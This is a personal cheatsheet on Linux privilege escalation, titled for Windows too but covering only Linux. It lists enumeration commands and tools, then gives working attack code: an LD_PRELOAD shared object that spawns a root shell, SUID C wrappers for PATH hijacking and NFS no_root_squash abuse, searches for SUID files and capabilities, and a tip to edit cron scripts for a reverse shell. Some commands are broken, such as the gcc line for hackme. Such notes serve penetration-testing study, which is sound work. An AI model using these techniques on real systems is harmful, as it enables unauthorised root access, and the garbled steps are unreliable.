# Basic Windows & Linux Privesc Cheatsheet

# Linux Privesc

What is Privillege Esclation?

It means that going from a lower permission account to a higher permission one. Thus Escalation your permissions. More technially it's the exploitation of a vulnerability, design flaw of configuation oversight within the OS.

Enumeration is the first thing you do once you gain access to any system. You may have accessed the system by exploiting a certain vulnerabilty or flaw.

# Basic Commands

"hostname" - *this command will return the hostname of the target machine. This can sometimes provide information about the target system's role without for example a corporate network.*

"uname -a" - *this command will provide is with information about the kernel used by the system. This could be useful when searching for potentional kernel vulnerabilities that could for example lead to privesc.*

"uname -r" to see kernel version

"cat /proc/version" - *this command provides information about the system processes, may give you information on the kernel version and addition information for example whether a compiler is installed.*

"cat /etc/issue" - *This file usually contains information about the OS* 

"ps" - *The ps command is a way to see the currently running processes running on the OS. Typing only ps will show you the processes of the current shell.* 

output:

- PID: *The process ID (this is unique for every process)*
- TTY: *Terminal type*
- Time: *Amount of CPU type used by the process*
- CMD: *The command or executable running*

a few useful options are:

- ps -A: *View all the currently running processes*
- ps axjf: *View process tree*
- ps aux*: This will show processes for all users (a) display the user that launch the process (u) show processes that are not attached to a terminal (x). This is a great way to understand the system and look for any vulnerabilities*.

"env" - *shows the environmental variables*

"sudo -l" - *this commands shows all the commands that the used can run using the sudo command. Thus with root privileges.* 

"id" - *The id command will give a general overview of the users's privilege level and groups.*

"/etc/passwd" - *reading this file can be an easy way to discover users on the system.*

"history" - *This command will show earlier commands*

"ifconfig" - *The target may be a good pivot point to another network. The ifconfig will give information about the network interfaces. You can check this using the "ip route" command which shows all the current routes.*

"netstat" - *The netstat command can be used with serveral different options to gather information on existing connections.*

- netstat -a: shows all listening ports and connections
- netstat  -at or netstat -au: can be used to list TCP or UDP protocols
- netstat -l: list ports in listening mode, those ports are ready and open to incoming connections

"find" - *This command allows the user to find and look for certain files*

A few automated tools:

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Privillege Escalation: Kernel Exploits

Kernel exploit methodology

- Identify the kernel version (this can be done using the "uname -r" command)
- Seach and find an exploit code for the kernel version of the target system
- Run the exploit

You can use Google to search for existing exploit code.

# Privillege Escalation: Sudo

The sudo command, by default, allows you to run a program with root privileges. This however these binary's can be exploited. You can check a users current situant related to root using the 
"sudo -l" command

**Leverage application functions**

Some applications will not have a known exploit within this context. For example Apache2, in this case we will have to use a manual exploit to leverage the function of the application. with the -f flag you can specifiy an alternate serverconfigfile. If we for example load the /etc/shadow file using this option we wil get an error with the first line of the /etc/shadow file.

**Leverage LD_PRELOAD**

On some systems you may come across the LD_PRELOAD environment option.

To exploit the LD_PRELOAD we can put these on the following steps:

- Check for LDD_PRELOAD (with the env_keep option
- Write a simple C code compiled as a shared object (.so extension) file
- Run the program with sudo rights and the LD_PORELOAD option pointing to our shared object file.

The following code will spawn a root shell: 

#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");

setgid(0);

setuid(0);

system("/bin/bash");

}

We can save this code as shell.c and compile it using gcc into a shared object file using the following command:

`gcc -fPIC -shared -o [shell.so](http://shell.so) shell.c -nostartfiles`

-fPIC: this generates position indepedent code for shared libraries

-o: write output to output file

-shared: generate shared object file for shared library

-nostartfiles: when you do not want any standard librariers

To exploit this we can run the command "sudo LD_PRELOAD=/home/user/ldpreload/shell.so find"

# Privillege Escalation: SUID

Much of Linux privesc reply on controlling users and files interactions. This is done using permissions. Permissions consist of read, write and execute permissions. However SUID (Set-user Identification) and SGID (Set-group Indentification). Thsee allow files to be exectuted with the permissions level of the file owner or the group owner.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bit sets.

You can compare those executables with the list on GTFOBins (https://gtfobins.github.io) and search for any binary may be exploitable.

# Privillege Escalation: Capabilities

Another method to escalate your privilleges is the use of Capabilities. Capabilities help manage privileges for example if a SOC analyst needs to use a tools that needs certain permissions a regular user would not be able to do that. IF the administrator doesn't want to give more permissions nor to give the user more privileges, they cvan change the capabilities of the binaryt. As a result the binary would ge through its task without needing a high privilege user.

We can use the `getcap` tool to list all the enabled capabilities. When running the getcap -r / command this will generate alot of errors so we can use the `2>/dev/null` command to filter them out. `getcap -r / 2>/dev/null`

note that the listed capabilities are not SUID files. Therefore are these files are not discovered when enumerating for SUID files. We can again use GTFObins for a list of binary's that be leveveraged for privilege escalation if we find a vulnerable set of capabilities.

# Privillege Escalation: Cron Jobs

Cron Jobs are jobs that are run on a specific time. You can read all the crontabs using the `cat /etc/crontab` we can then modify any script to get for example a reverse shell. If this script is run with root privilleges the reverse shell will be a root shell.
# Privillege Escalation: PATH variable

PATH in Linux in an environmetnal variable that tells the opterating system where to search for executables `echo $PATH` For example if we type "program" in the command line this is the location Linux will look for an executable called "program" 

The following script will try to execute the hackme binary and will look for it in the $PATH table

`#include<unistd.h>
void main()
{ setuid(0);
setgid(0);
system("hackme");
}`

Safe this program as a .c file and compile it using gcc `gcc hackme -o shell`
Now give this compiled file SUID permissions  `chmod u+s shell`

If you can't compile on the target machine do this locally and open up a local python server and download it to the target machine. 

Now make a binary called "hackme" this is the binary that the .c script will try to execute once we add our path to the PATH variable. For example (don't forget to add permissions to the binary)

`echo "/bin/bash" > hackme` 

this will make a simple binary that will open a bash shell. You can do this in for example in the /tmp folder. To add the /tmp to our variable we will use the export `PATH=/tmp:$PATH` command

This will add /tmp to the $PATH variable.

# Privillege Escalation: NFS

Instead of doing privillege Escalation on an internal network. Shared folders, remote access such as SSGH can also help you gain root access to the initial target. In some cases you will need both, for example finding a private SSH key in the .ssh folder of a user and then connecting via SSH with root privileges. However we can also exploit a misconfigured network shell. This vector is sometimes overlooked. 

Network File Sharing or in short NFS config is stored in the /etc/exports file and this can be usually read by users. For this escalation method to work its critcal that the "no_root_squash" option. If this option is present we can create an executable with SUID set and run it on the target system. 

We will first start by enumerating the shares on the machine using the `showmount -e <ip>` command. 

We will mount our folder to the folder with the no_root_squash option enabled. using the `mount -o rw 10.10.70.63:/tmp /tmp/nfs` now your local system is mounted with the system. Go into the the root user using the su command, and make a simple script that call the /bin/bash binary and give it the SUID permissions, now execute the SUID file from your target machine. You can for example use this script: 
`#include<unistd.h>
void main()
{ setuid(0);
setgid(0);
system("/bin/bash");
}`
